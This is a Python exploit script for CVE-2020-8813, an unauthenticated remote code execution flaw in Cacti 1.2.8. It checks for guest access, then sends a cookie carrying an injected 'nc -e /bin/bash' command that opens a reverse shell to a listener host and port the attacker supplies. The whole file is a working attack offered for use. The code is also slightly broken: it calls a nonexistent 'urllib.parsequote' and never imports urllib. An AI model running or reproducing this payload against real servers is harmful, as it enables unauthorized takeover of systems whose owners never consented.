import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2020-8813
# Cacti v1.2.8 Unauthenticated RCE
class CVE2020_8813:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, host, port):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.host, self.port = host, port
        self.session = requests.Session()

    # get poller
    def get_poller(self):
        print (LogColors.BLUE + "search file and check guest..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url + "/graph_realtime.php?action=init")
        except Exception:
            print (LogColors.RED + "error while requesting file :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok and "poller_realtime.php" in r.text:
                print (LogColors.YELLOW + "guest is enabled :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "error while requesting file :(" + LogColors.ENDC)
                sys.exit()

    # generate payload
    def get_payload(self):
        print (LogColors.BLUE + "prepare payload..." + LogColors.ENDC)
        payload = ";nc${IFS}-e${IFS}/bin/bash${IFS}{}${IFS}{}".format(self.host, self.port)
        return payload
    
    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        cookies = {'Cacti': urllib.parsequote(self.get_payload())}
        try:
            r = self.session.get(self.url + "/graph_realtime.php?action=init", cookies = cookies)
        except Exception:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        self.get_poller()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    ip, port = args['ip'], args['port']
    cve = CVE2020_8813(url, ip, port)
    cve.exploit()

